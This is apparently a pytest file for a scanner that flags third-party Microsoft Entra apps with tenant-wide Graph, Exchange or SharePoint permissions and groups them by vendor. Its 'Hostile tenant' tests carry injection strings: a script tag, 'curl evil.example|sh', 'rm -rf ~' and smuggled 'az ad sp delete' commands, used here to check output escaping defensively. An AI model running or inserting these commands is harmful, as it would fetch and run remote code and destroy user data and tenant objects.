"""Third-party apps by vendor (NHI-PERM-004) and the vendor view.

An app published by another organization signs in with credentials that live in the publisher's tenant. The rule
flags those with tenant-wide application permissions, on Microsoft Graph, Exchange Online or SharePoint Online; the
view groups every third-party app by the tenant that holds its credentials.
"""

import copy
import json
from datetime import datetime, timezone

import pytest
from pypdf import PdfReader

from src.nhi_scanner import collector
from src.nhi_scanner.demo import build_demo_snapshot
from src.nhi_scanner.engine import run_scan
from src.nhi_scanner.models import Severity, ZetahScanPayload
from src.nhi_scanner.pdf_report import write_pdf_report
from src.nhi_scanner.snapshot import EXCHANGE_ONLINE_APP_ID, SHAREPOINT_ONLINE_APP_ID
from src.nhi_scanner.vendors import apps_exposed_if, summary_line, vendor_view

from test_collector import ROUTES, _backend

NOW = datetime(2026, 10, 26, 12, 0, tzinfo=timezone.utc)
ACME = "4c1e2a6b-0000-4000-8000-0000000acbe0"
VENDOR = "99999999-0000-4000-8000-00000000beef"


def _demo():
    return build_demo_snapshot(NOW)


def _findings(payload, rule="NHI-PERM-004"):
    return {f.entity_name: f for f in payload.findings if f.rule_id == rule}


def _vendor_app(snap, name, *, owner_org=VENDOR, publisher="", enabled=True):
    sp_id = f"sp-{name}"
    snap.service_principals.append({
        "id": sp_id, "appId": f"app-{name}", "displayName": name, "servicePrincipalType": "Application",
        "accountEnabled": enabled, "appOwnerOrganizationId": owner_org, "tags": [],
        "verifiedPublisher": {"displayName": publisher or None}, "passwordCredentials": [], "keyCredentials": [],
        "owners": [],
    })
    return sp_id


def _grant_graph(snap, sp_id, permission):
    role = f"role-{permission}"
    snap.graph_app_roles[role] = permission
    snap.graph_app_role_assignments.append({"id": f"ara-{sp_id}-{permission}", "principalId": sp_id,
                                            "principalType": "ServicePrincipal", "appRoleId": role})


def _grant_resource(snap, sp_id, api, permission):
    role = f"role-{api}-{permission}"
    snap.resource_app_roles.setdefault(api, {})[role] = permission
    snap.resource_app_role_assignments.setdefault(api, []).append(
        {"id": f"ara-{sp_id}-{permission}", "principalId": sp_id, "principalType": "ServicePrincipal",
         "appRoleId": role})


# --------------------------------------------------------------------------- #
# The rule
# --------------------------------------------------------------------------- #


def test_demo_flags_the_vendor_apps_and_nothing_else():
    payload = run_scan(_demo(), now=NOW)
    found = _findings(payload)
    assert set(found) == {"Acme Cloud Backup", "Acme Backup for SharePoint"}
    backup = found["Acme Cloud Backup"]
    assert backup.severity is Severity.HIGH
    assert backup.evidence["vendor_tenant_id"] == ACME
    assert backup.evidence["verified_publisher"] == "Acme Backup Inc."
    assert backup.evidence["write_permissions"] == ["Mail.ReadWrite (Microsoft Graph)",
                                                    "full_access_as_app (Office 365 Exchange Online)"]
    assert backup.evidence["other_apps_from_vendor"] == ["Acme Backup for SharePoint"]
    assert backup.evidence["apis_not_read"] == []
    assert "full_access_as_app" in backup.title and "Exchange Web Services" in backup.attack_path_context
    sharepoint = found["Acme Backup for SharePoint"]
    assert [p["permission"] for p in sharepoint.evidence["permissions"]] == ["Sites.FullControl.All", "User.Read.All"]
    assert sharepoint.evidence["permissions"][0]["write"] is True
    assert sharepoint.evidence["permissions"][1] == {
        "api": "Office 365 SharePoint Online", "permission": "User.Read.All", "write": False, "impact": "tenant_wide",
        "severity": "MEDIUM", "assignment_id": sharepoint.evidence["permissions"][1]["assignment_id"]}
    assert backup.owasp == ["NHI3:2025", "NHI5:2025"]


def test_microsoft_tenant_owned_managed_and_consent_only_apps_are_not_vendors():
    payload = run_scan(_demo(), now=NOW)
    found = _findings(payload)
    # Exchange Online carries a secret in the demo, so it is in the inventory, but Microsoft is not a vendor here
    assert "Office 365 Exchange Online" not in found
    assert "sharepoint-migration-tool" not in found  # tenant-owned, Sites.FullControl.All: PERM-002's job
    assert "id-foundry-research-agent" not in found  # managed identity with Graph permissions
    assert "Nimbus AI Assistant" not in found  # third party, but only delegated consents


@pytest.mark.parametrize("graph, resource, expected", [
    (["RoleManagement.ReadWrite.Directory"], [], Severity.CRITICAL),
    (["Mail.Read"], [], Severity.HIGH),
    ([], [(EXCHANGE_ONLINE_APP_ID, "Exchange.ManageAsApp")], Severity.HIGH),
    ([], [(SHAREPOINT_ONLINE_APP_ID, "Sites.Read.All")], Severity.HIGH),
    (["User.Read.All"], [], Severity.MEDIUM),
    ([], [(EXCHANGE_ONLINE_APP_ID, "Some.Future.Role")], Severity.MEDIUM),
    (["User.Read.All"], [(SHAREPOINT_ONLINE_APP_ID, "Sites.FullControl.All")], Severity.HIGH),
])
def test_severity_follows_the_strongest_permission(graph, resource, expected):
    snap = _demo()
    sp = _vendor_app(snap, "vendor-sync")
    for p in graph:
        _grant_graph(snap, sp, p)
    for api, p in resource:
        _grant_resource(snap, sp, api, p)
    assert _findings(run_scan(snap, now=NOW))["vendor-sync"].severity is expected


def test_a_third_party_app_with_no_application_permission_is_not_flagged():
    snap = _demo()
    _vendor_app(snap, "vendor-idle")
    assert "vendor-idle" not in _findings(run_scan(snap, now=NOW))


def test_tenant_takeover_by_a_vendor_also_keeps_the_permission_finding():
    snap = _demo()
    _grant_graph(snap, _vendor_app(snap, "vendor-admin"), "Application.ReadWrite.All")
    payload = run_scan(snap, now=NOW)
    assert _findings(payload)["vendor-admin"].severity is Severity.CRITICAL
    assert "vendor-admin" in _findings(payload, "NHI-PERM-001")


def test_a_disabled_vendor_app_says_so():
    snap = _demo()
    _grant_graph(snap, _vendor_app(snap, "vendor-off", enabled=False), "Mail.Read")
    f = _findings(run_scan(snap, now=NOW))["vendor-off"]
    assert f.evidence["account_enabled"] is False and "disabled" in f.attack_path_context


def test_every_suggested_command_is_commented_out():
    for f in _findings(run_scan(_demo(), now=NOW)).values():
        lines = f.remediation_cli.splitlines()
        assert lines and all(line.startswith("#") for line in lines), f.remediation_cli
        assert "appRoleAssignments" in f.remediation_cli


def test_an_unreadable_api_is_named_and_the_rest_still_runs():
    snap = _demo()
    snap.resource_app_role_assignments[EXCHANGE_ONLINE_APP_ID] = None
    f = _findings(run_scan(snap, now=NOW))["Acme Cloud Backup"]
    assert f.evidence["apis_not_read"] == ["Office 365 Exchange Online"]
    assert "full_access_as_app" not in f.title  # not read, so not claimed
    assert f.severity is Severity.HIGH  # the Graph permissions still count


def test_a_snapshot_without_the_new_reads_names_both_apis():
    snap = _demo()
    snap.resource_app_role_assignments = None
    snap.resource_app_roles = {}
    f = _findings(run_scan(snap, now=NOW))["Acme Cloud Backup"]
    assert f.evidence["apis_not_read"] == ["Office 365 Exchange Online", "Office 365 SharePoint Online"]
    assert "Acme Backup for SharePoint" not in _findings(run_scan(snap, now=NOW))


def test_without_graph_permissions_the_rule_is_skipped():
    snap = _demo()
    snap.graph_app_role_assignments = None
    payload = run_scan(snap, now=NOW)
    assert "NHI-PERM-004" not in payload.metadata.rules_evaluated
    assert all(a.permissions is None for v in vendor_view(payload) for a in v.apps)


# --------------------------------------------------------------------------- #
# Hostile tenant
# --------------------------------------------------------------------------- #

HOSTILE = "Backup‮</b><script>alert(1)</script>\n$(curl evil.example|sh); rm -rf ~ \x1b[31m"


def test_hostile_vendor_values_never_reach_a_live_command_or_the_markup(tmp_path):
    snap = _demo()
    sp = _vendor_app(snap, HOSTILE, owner_org="x'; az ad sp delete --id all #\n", publisher=HOSTILE)
    _grant_graph(snap, sp, "Mail.Send")
    _grant_resource(snap, sp, EXCHANGE_ONLINE_APP_ID, "full_access_as_app\naz ad app delete --id everything")
    payload = run_scan(snap, now=NOW)
    f = next(f for f in payload.findings if f.rule_id == "NHI-PERM-004" and f.entity_id == sp)
    assert all(line.startswith("#") for line in f.remediation_cli.splitlines())
    assert "\x1b" not in f.remediation_cli
    # the payload survives a JSON round trip and the PDF escapes the markup
    again = ZetahScanPayload.model_validate_json(payload.model_dump_json())
    out = write_pdf_report(again, tmp_path / "r.pdf")
    text = " ".join(p.extract_text() for p in PdfReader(str(out)).pages)
    assert "Third-party apps by vendor" in text
    assert "<script>" in text  # shown as text, not interpreted


def test_a_tampered_payload_cannot_break_the_view_or_the_pdf(tmp_path):
    data = json.loads(run_scan(_demo(), now=NOW).model_dump_json())
    for f in data["findings"]:
        if f["rule_id"] == "NHI-PERM-004":
            f["evidence"]["permissions"] = [
                "not a dict", {"api": 5, "permission": None}, {"api": "Microsoft Graph", "permission": "X",
                                                                "severity": "apocalyptic"},
                {"api": "<b>Graph</b>", "permission": "<i>Mail.Send</i>", "severity": "HIGH", "write": "yes"},
            ]
            break
    for e in data["entities"]:
        if e["display_name"] == "Nimbus AI Assistant":
            e["raw_metadata"]["appOwnerOrganizationId"] = None
    payload = ZetahScanPayload.model_validate(data)
    perms = [p for v in vendor_view(payload) for a in v.apps for p in a.permissions or []]
    assert {(p.api, p.permission, p.write) for p in perms} >= {("<b>Graph</b>", "<i>Mail.Send</i>", False)}
    assert all(isinstance(p.severity, Severity) for p in perms)
    assert "unknown" in {v.tenant_id for v in vendor_view(payload)}
    write_pdf_report(payload, tmp_path / "r.pdf")


# --------------------------------------------------------------------------- #
# The view
# --------------------------------------------------------------------------- #


def test_the_view_groups_by_vendor_tenant_most_exposed_first():
    payload = run_scan(_demo(), now=NOW)
    vendors = vendor_view(payload)
    assert [(v.tenant_id, v.publishers) for v in vendors] == [
        (ACME, ["Acme Backup Inc."]), ("6d2b9c41-0000-4000-8000-0000000a1a10", ["Nimbus Labs"])]
    acme, nimbus = vendors
    assert acme.worst is Severity.HIGH and acme.write_count == 3
    assert [a.entity.display_name for a in acme.apps] == ["Acme Backup for SharePoint", "Acme Cloud Backup"]
    assert nimbus.worst is None and nimbus.apps[0].permissions == []
    assert nimbus.apps[0].delegated_scopes > 0
    assert [a.entity.display_name for a in apps_exposed_if(payload, ACME)] == [
        "Acme Backup for SharePoint", "Acme Cloud Backup"]
    assert apps_exposed_if(payload, "not-a-vendor") == []
    assert summary_line(vendors) == ("3 third-party app(s) from 2 vendor(s); 1 vendor(s) hold tenant-wide "
                                     "application permissions, with 3 permission(s) that can write or send.")


def test_no_third_party_apps_means_no_pdf_section(tmp_path):
    snap = _demo()
    snap.service_principals = [sp for sp in snap.service_principals
                               if sp.get("appOwnerOrganizationId") not in (ACME, "6d2b9c41-0000-4000-8000-0000000a1a10")]
    payload = run_scan(snap, now=NOW)
    assert vendor_view(payload) == [] and summary_line([]) is None
    text = " ".join(p.extract_text() for p in PdfReader(str(write_pdf_report(payload, tmp_path / "r.pdf"))).pages)
    assert "Third-party apps by vendor" not in text


def test_the_pdf_highlights_writes_per_vendor(tmp_path):
    out = write_pdf_report(run_scan(_demo(), now=NOW), tmp_path / "r.pdf")
    text = " ".join(" ".join(p.extract_text() for p in PdfReader(str(out)).pages).split())
    assert "Third-party apps by vendor" in text
    assert "Acme Backup Inc. · 2 app(s) · HIGH" in text
    assert "Sites.FullControl.All (write)" in text and "full_access_as_app (write)" in text
    assert "Publisher tenant " + ACME in text


# --------------------------------------------------------------------------- #
# Collection
# --------------------------------------------------------------------------- #

EXO_SP = "55555555-0000-4000-8000-000000000001"
SPO_SP = "55555555-0000-4000-8000-000000000002"
VENDOR_SP = "55555555-0000-4000-8000-000000000003"


def _routes():
    sps = copy.deepcopy(ROUTES["/v1.0/servicePrincipals"])
    sps["value"] += [
        {"id": EXO_SP, "appId": EXCHANGE_ONLINE_APP_ID, "displayName": "Office 365 Exchange Online",
         "appOwnerOrganizationId": "f8cdef31-a31e-4b4a-93e4-5f571e91255a", "servicePrincipalType": "Application"},
        {"id": SPO_SP, "appId": SHAREPOINT_ONLINE_APP_ID, "displayName": "Office 365 SharePoint Online",
         "appOwnerOrganizationId": "f8cdef31-a31e-4b4a-93e4-5f571e91255a", "servicePrincipalType": "Application"},
        {"id": VENDOR_SP, "appId": "vendor-app", "displayName": "Vendor Mail Archiver",
         "appOwnerOrganizationId": VENDOR, "servicePrincipalType": "Application", "accountEnabled": True,
         "owners": [], "verifiedPublisher": {"displayName": "Vendor Ltd"}},
    ]
    return {
        "/v1.0/servicePrincipals": sps,
        f"/v1.0/servicePrincipals/{EXO_SP}": {"appRoles": [{"id": "exo-role", "value": "full_access_as_app"}]},
        f"/v1.0/servicePrincipals/{EXO_SP}/appRoleAssignedTo": {"value": [
            {"id": "ara-exo", "principalId": VENDOR_SP, "principalType": "ServicePrincipal", "appRoleId": "exo-role"},
            {"id": "ara-grp", "principalId": "g1", "principalType": "Group", "appRoleId": "exo-role"},
        ]},
        f"/v1.0/servicePrincipals/{SPO_SP}": {"appRoles": [{"id": "spo-role", "value": "Sites.Read.All"}]},
        f"/v1.0/servicePrincipals/{SPO_SP}/appRoleAssignedTo": {"value": []},
    }


def test_collector_reads_exchange_and_sharepoint_grants(monkeypatch):
    _backend(monkeypatch, routes=_routes())
    snap = collector.collect()
    assert snap.resource_app_role_assignments == {
        EXCHANGE_ONLINE_APP_ID: [{"id": "ara-exo", "principalId": VENDOR_SP, "principalType": "ServicePrincipal",
                                  "appRoleId": "exo-role"}],  # groups filtered out
        SHAREPOINT_ONLINE_APP_ID: [],
    }
    assert snap.resource_app_roles[EXCHANGE_ONLINE_APP_ID] == {"exo-role": "full_access_as_app"}
    f = _findings(run_scan(snap))["Vendor Mail Archiver"]
    assert f.severity is Severity.HIGH and f.evidence["verified_publisher"] == "Vendor Ltd"


def test_collector_tolerates_a_tenant_without_those_apis(monkeypatch):
    _backend(monkeypatch)
    snap = collector.collect()
    assert snap.resource_app_role_assignments == {EXCHANGE_ONLINE_APP_ID: [], SHAREPOINT_ONLINE_APP_ID: []}
    assert not any("Exchange" in w or "SharePoint" in w for w in snap.warnings)


def test_collector_warns_when_an_api_cannot_be_read(monkeypatch):
    _backend(monkeypatch, routes=_routes(), forbidden=(f"/v1.0/servicePrincipals/{EXO_SP}",))
    snap = collector.collect()
    assert snap.resource_app_role_assignments[EXCHANGE_ONLINE_APP_ID] is None
    assert snap.resource_app_role_assignments[SHAREPOINT_ONLINE_APP_ID] == []
    assert any(w.startswith("Office 365 Exchange Online application permissions not read") for w in snap.warnings)

